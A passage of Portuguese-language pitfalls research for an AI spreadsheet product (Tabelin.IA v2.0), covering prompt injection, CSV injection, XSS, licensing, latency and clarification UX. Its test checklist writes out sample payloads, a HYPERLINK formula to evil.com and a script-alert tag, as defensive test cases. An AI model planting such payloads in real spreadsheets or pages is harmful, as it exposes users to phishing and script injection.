| Fórmulas do engine avaliadas sem sandbox | Path traversal ou execução de função customizada maliciosa | Usar apenas o subconjunto de funções explicitamente permitido; não expor funções de I/O do engine |
| Conteúdo de cell passado como prompt ao LLM sem delimitadores | Prompt injection via célula editada | Envolver conteúdo de células em bloco delimitado `[DADOS DA TABELA]...[/DADOS DA TABELA]` ao referenciar em prompts |
| Classificador de intent aceitando payload muito grande | Prompt injection para desviar classificação ou consumir tokens extras | Limitar tamanho do prompt do usuário antes de enviar ao classifier (mesmo limite do sistema atual: ~MAX_EXTRACTED_CHARS) |

---

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Remover tabs sem oferecer override de intent | Usuário não tem como corrigir misrouting sem re-escrever o prompt inteiro | Pills de "reformatar como: Fórmula / SQL / Script" abaixo de cada resposta para correção com um clique |
| Loop de clarificação sem progresso visível | Usuário não sabe se o sistema está "chegando a algum lugar" | Indicador "Pergunta 1 de 2" + botão "Gerar mesmo assim" desde a primeira clarificação |
| Quota debitada em clarificações | Usuário free perde 4 usos respondendo perguntas, sem receber nenhuma tabela | Quota debitada somente na geração; clarificações são custo da plataforma |
| Tabela gerada mas sem path para editar a fórmula de uma célula | Usuário quer ajustar uma fórmula mas não sabe como sem reabrir o chat | Célula com fórmula deve ter ícone de "editar via chat" que pré-popula o prompt de refinamento |
| Export exporta a tabela "estrutural" mas não o estado editado | Usuário edita 10 células, exporta, e o CSV tem os dados originais | Exportar o estado atual do grid (valores in-memory), não o snapshot inicial da geração |
| Over-asking em clarificação ("Qual o nome da empresa? Qual o período? Qual a moeda? Quantas linhas?") | 4 perguntas separadas = 4 turnos = usuário desiste | Agrupar todas as dúvidas em uma única mensagem de clarificação: "Preciso de: nome da empresa, período, moeda, número de linhas. Pode fornecer?" |

---

## "Looks Done But Isn't" Checklist

- [ ] **ptBR locale:** `=PROCV(A1;B1:C10;2;0)` na célula avalia corretamente (não retorna `#NAME?`).
- [ ] **Separador ptBR:** `=SOMASE(A1:A5;B1:B5;">0")` com ponto-e-vírgula avalia identicamente à versão em inglês com vírgula.
- [ ] **CSV injection:** Célula editada com `=HYPERLINK("http://evil.com","clique")` exporta como texto literal `'=HYPERLINK(...)`, não como fórmula no CSV.
- [ ] **XSS:** Célula com `<script>alert(1)</script>` renderiza os tags como texto literal, não executa JavaScript.
- [ ] **Loop limit:** Prompt vago ("faça uma tabela") não gera mais de 2 perguntas de clarificação antes de forçar geração.
- [ ] **Quota isolada:** Usuário free que passa pelo loop completo (2 clarificações + 1 geração) consome exatamente 1 unidade de quota, não 3.
- [ ] **Histórico intacto:** Follow-up no chat unificado após geração de fórmula injeta o histórico de formula correto, não histórico de SQL ou generic "unified".
- [ ] **Performance:** Grid com 200 linhas × 20 colunas faz scroll a ≥ 30 FPS em Chrome num laptop de mid-range.
- [ ] **Latência unificada:** First-token do chat unificado ocorre em ≤ 2.5s (p50) — medir em produção, não em localhost.
- [ ] **Scope check:** Componente de tabela não tem funcionalidade de merge de células, freeze de painel, ou múltiplos sheets implementada ou em progresso.
- [ ] **GPL check:** Se HyperFormula for usado, contrato comercial assinado está documentado no legal register do projeto.
- [ ] **Export estado atual:** CSV exportado após edição pelo usuário reflete os valores editados, não os valores originais da geração.

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| HyperFormula em produção sem licença | HIGH | Reescrita do engine de fórmulas; rollback da feature de tabela; negociação de licença retroativa |
| ptBR não funciona após lançamento | HIGH | Criar custom language pack ptBR (1–2 semanas); hotfix urgente; comunicar usuários |
| Loop infinito de clarificação em produção | MEDIUM | Deploy de hotfix com `maxClarifications = 2` hardcoded; rollback da feature se não resolvido em 24h |
| CSV injection relatado por usuário | HIGH | Sanitização retroativa no export; comunicar usuários que exportaram arquivos potencialmente afetados; patch imediato |
| Quota free esgotada em clarificações | MEDIUM | Reverter débito de quota retroativo para sessões de clarificação; patch de quota para não debitar em `action: clarify` |
| Histórico corrompido com toolKind errado | MEDIUM | Migração de banco para re-classificar exchanges com toolKind = "unified"; pode levar a contexto incorreto em conversas longas |
| Scope creep detectado pós-desenvolvimento | HIGH | Feature freeze; revisão de escopo formal com stakeholders; corte de features para v3.0; não fazer rollback de código — fazer feature flag off |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Licença GPL do HyperFormula | Stack decision (antes de qualquer código de tabela) | License file ou contrato documentado antes do início do desenvolvimento |
| ptBR não built-in no engine | Fase de tabela interativa — início | `=PROCV()` avalia corretamente em smoke test |
| Separador `;` vs `,` | Fase de tabela interativa — início | Fórmulas ptBR com `;` avaliam identicamente a versão EN com `,` |
| Latência do classifier (+2.5s) | Fase de roteamento de intent | Latência de first-token ≤ 2.5s p50 medida em produção |
| Misrouting + perda de affordance das tabs | Fase de roteamento de intent + migração UX | Pills de override visíveis; smoke tests de cada toolKind via chat unificado |
| toolKind dinâmico quebrando histórico | Fase de chat unificado + integração de histórico | Follow-up recebe histórico correto por toolKind classificado |
| Loop infinito de clarificação | Fase de clarificação — design | Prompts vagos geram ≤ 2 clarificações antes de forçar geração |
| Estado de clarificação perdido em truncagem | Fase de clarificação + contexto multi-turn | Geração após clarificação usa requisitos do primeiro turno mesmo com histórico truncado |
| Token cost O(n²) no loop | Fase de clarificação — design | Custo médio de geração de tabela ≤ 2x custo de geração de fórmula simples |
| Quota debitada em clarificações | Fase de clarificação + quota-service | Ciclo completo de clarificação + geração consome 1 unidade de quota free |
| CSV injection no export | Fase de tabela interativa — export | Célula com `=...` exporta com prefixo `'` em CSV e com type `s` em XLSX |
| XSS em células renderizadas | Fase de tabela interativa — cell renderer | Célula com `<script>` renderiza como texto literal |
| Performance sem virtualização | Fase de tabela interativa — início | Grid com 200 linhas roda a ≥ 30 FPS em mid-range hardware |
| Scope creep para Excel completo | Fase de requisitos (antes de dev) + UAT | Checklist de features fora de escopo verificada a cada sprint |

---

## Sources

- [HyperFormula Licensing — handsontable.com](https://hyperformula.handsontable.com/docs/guide/licensing.html) — GPLv3 para projetos não-comerciais; licença comercial para SaaS fechado
- [Formualizer vs HyperFormula comparison — docs.bswen.com](https://docs.bswen.com/blog/2026-03-04-formualizer-vs-hyperformula-comparison/) — MIT/Apache-2.0 alternatives; "For commercial projects, Formualizer wins on license alone"
- [HyperFormula i18n features — handsontable.com](https://hyperformula.handsontable.com/guide/i18n-features.html) — 17 idiomas suportados; ptBR não confirmado built-in
- [HyperFormula localizing functions — handsontable.com](https://hyperformula.handsontable.com/guide/localizing-functions.html) — ptBR ausente da lista built-in; custom pack requerido
- [OWASP CSV Injection — owasp.org](https://owasp.org/www-community/attacks/CSV_Injection) — Vetores de CSV injection e prevenção com prefixo `'`
- [OWASP WSTG CSV Injection Testing — owasp.org](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/21-Testing_for_CSV_Injection) — Guia de teste de CSV injection
- [React XSS prevention — pragmaticwebsecurity.com](https://pragmaticwebsecurity.com/articles/spasecurity/react-xss-part2.html) — dangerouslySetInnerHTML + DOMPurify pattern
- [LLM Latency — The LLM Latency Problem Nobody Is Solving Right — medium.com](https://medium.com/@kollaikalrupesh/the-llm-latency-problem-nobody-is-solving-right-and-5-fixes-d0305b15d486) — zero-shot LLM classification: ~3.447ms latência média
- [Intent Classification in < 1ms with Embeddings — medium.com](https://medium.com/@durgeshrathod.777/intent-classification-in-1ms-how-we-built-a-lightning-fast-classifier-with-embeddings-db76bfb6d964) — embed-based classifier: < 50ms vs 3.447ms LLM
- [Multi-Turn LLM Conversation Degradation — arize.com](https://arize.com/glossary/multi-turn-llm-conversation-degradation/) — performance degrada 39% em média em conversas multi-turn
- [LLMs Get Lost In Multi-Turn Conversation — arxiv.org](https://arxiv.org/abs/2505.06120) — modelos perdem contexto de primeiros turnos com crescimento de histórico
- [LLM Clarification Loop anti-patterns — medium.com (Marvelous MLOps)](https://medium.com/marvelous-mlops/patterns-and-anti-patterns-for-building-with-llms-42ea9c2ddc90) — over-asking como anti-padrão documentado
- [TanStack Virtual documentation — tanstack.com](https://tanstack.com/virtual/latest) — virtualização headless para grids grandes
- [React Virtualization Showdown — mashuktamim.medium.com](https://mashuktamim.medium.com/react-virtualization-showdown-tanstack-virtualizer-vs-react-window-for-sticky-table-grids-69b738b36a83) — TanStack Virtual handles 1M cells; measurement errors common pitfall
- [Microsoft Power Fx Global Support — learn.microsoft.com](https://learn.microsoft.com/en-us/power-platform/power-fx/global) — separador de argumento determinado pelo browser locale; ptBR usa `;`
- Código-fonte existente: `apps/web/src/server/usage/quota-service.ts`, `apps/web/src/server/tools/conversation-repository.ts`, `apps/web/src/server/ai/context-messages.ts`

---
*Pitfalls research for: Tabelin.IA v2.0 — Chat Unificado & Tabela Viva*
*Researched: 2026-06-08*
